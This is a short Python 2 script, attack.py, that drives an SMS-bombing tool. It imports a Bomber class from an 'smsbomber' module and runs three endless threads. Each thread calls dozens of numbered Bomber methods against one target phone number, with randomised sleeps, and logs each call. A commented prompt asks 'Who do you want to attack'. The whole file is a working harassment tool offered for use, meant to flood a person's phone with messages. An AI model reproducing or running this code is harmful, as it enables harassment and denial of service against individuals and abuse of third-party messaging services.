# encoding=utf8
# attack.py

import time
import random
from smsbomber import Bomber
import threading
import logging

logging.basicConfig(level=logging.DEBUG,
                    filename='attack.log',
                    filemode='w',
                    datefmt='%Y/%m/%d %H:%M:%S',
                    format='%(asctime)s - %(name)s - %(levelname)s - %(lineno)d - %(module)s - %(message)s')
logger = logging.getLogger(__name__)

def attack(phone, begin, end):
    while True:
        func = ['func%d' %i for i in range(begin, end)]
        for i in func:
            if hasattr(Bomber, i):
                try:
                    getattr(Bomber(phone), i)()
                    logger.info('{} has excuted!'.format(i))
                    time.sleep(random.randint(5, 10))
                except:
                    logger.error('{} meet some problems!'.format(i))
                    continue
            else:
                logger.error('There is not {}'.format(i))
        time.sleep(random.randint(5, 10))


# phone = raw_input('Who do you want to attack:').strip()
phone = ''
thread1 = threading.Thread(target=attack,name='thread1',args=(phone, 0, 11))
thread2 = threading.Thread(target=attack,name='thread2',args=(phone, 11, 22))
thread3 = threading.Thread(target=attack,name='thread3',args=(phone, 22, 34))
# threading.current_thread().name
thread1.start()
thread2.start()
thread3.start()
thread1.join()
thread2.join()
thread3.join()
print 'Good Bye!'
